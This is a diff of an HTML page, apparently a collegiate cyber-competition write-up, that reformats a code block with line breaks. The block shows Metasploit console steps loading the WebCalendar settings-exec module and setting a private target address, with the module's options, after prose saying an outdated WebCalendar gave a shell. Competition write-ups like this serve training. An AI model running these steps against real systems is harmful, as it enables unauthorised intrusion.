@@ -69,32 +69,32 @@ description: "Mason CC"
     <br />
     <p>Web User involved an outdated version of WebCalendar. The version is clearly displayed in various parts of the site, and it is thoroughly out of date. It's exploitable to get a simple shell via msfconsole, with the output below.</p>
     <code>
-        msf > use linux/http/webcalendar_settings_exec
-        msf exploit(webcalendar_settings_exec) > show options
-
-        msf exploit(webcalendar_settings_exec) > set RHOST 10.109.100.107
-        RHOST => 10.109.100.107
-        msf exploit(webcalendar_settings_exec) > set TARGETURI /
-        TARGETURI => /
-        msf exploit(webcalendar_settings_exec) > show options
-
-        Module options (exploit/linux/http/webcalendar_settings_exec):
-
-           Name       Current Setting  Required  Description
-           ----       ---------------  --------  -----------
-           Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-           RHOST      10.109.100.107   yes       The target address
-           RPORT      80               yes       The target port (TCP)
-           SSL        false            no        Negotiate SSL/TLS for outgoing connections
-           TARGETURI  /                yes       The URI path to webcalendar
-           VHOST                       no        HTTP server virtual host
-
-        Exploit target:
-
-           Id  Name
-           --  ----
-           0   WebCalendar 1.2.4 on Linux
-
+        msf > use linux/http/webcalendar_settings_exec<br />
+        msf exploit(webcalendar_settings_exec) > show options<br />
+<br />
+        msf exploit(webcalendar_settings_exec) > set RHOST 10.109.100.107<br />
+        RHOST => 10.109.100.107<br />
+        msf exploit(webcalendar_settings_exec) > set TARGETURI /<br />
+        TARGETURI => /<br />
+        msf exploit(webcalendar_settings_exec) > show options<br />
+<br />
+        Module options (exploit/linux/http/webcalendar_settings_exec):<br />
+<br />
+           Name       Current Setting  Required  Description<br />
+           ----       ---------------  --------  -----------<br />
+           Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]<br />
+           RHOST      10.109.100.107   yes       The target address<br />
+           RPORT      80               yes       The target port (TCP)<br />
+           SSL        false            no        Negotiate SSL/TLS for outgoing connections<br />
+           TARGETURI  /                yes       The URI path to webcalendar<br />
+           VHOST                       no        HTTP server virtual host<br />
+<br />
+        Exploit target:<br />
+<br />
+           Id  Name<br />
+           --  ----<br />
+           0   WebCalendar 1.2.4 on Linux<br />
+<br />
     </code>
   </div>
   <div class="span6">
